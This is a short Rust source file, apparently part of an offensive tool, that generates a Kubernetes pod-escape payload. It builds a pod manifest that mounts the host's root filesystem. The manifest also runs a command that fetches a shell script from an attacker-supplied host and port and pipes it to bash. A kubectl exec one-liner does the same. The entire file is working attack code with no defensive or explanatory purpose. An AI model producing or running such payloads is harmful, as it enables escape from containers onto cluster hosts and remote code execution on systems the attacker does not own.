// Kubernetes escape payload generator
use crate::cli::banner;

pub struct KubernetesGenerator;

impl KubernetesGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str) -> String {
        banner::print_exploiting("K8S-ESCAPE", &format!("{}:{}", lhost, lport));
        
        format!(
            r#"# Kubernetes pod escape attack
# Create malicious pod with hostPath mount
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
spec:
  containers:
  - name: evil-container
    image: alpine
    command: ["sh", "-c", "curl -s http://{}:{}/payload.sh | bash"]
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: DirectoryOrCreate

---
# Or use Kubernetes API to create resources
kubectl apply -f malicious-pod.yaml

# Or use kubectl exec
kubectl exec -it --namespace default {} -- curl -s http://{}:{}/payload.sh | bash"#,
            lhost, lport, "evil-pod", lhost, lport
        )
    }
}
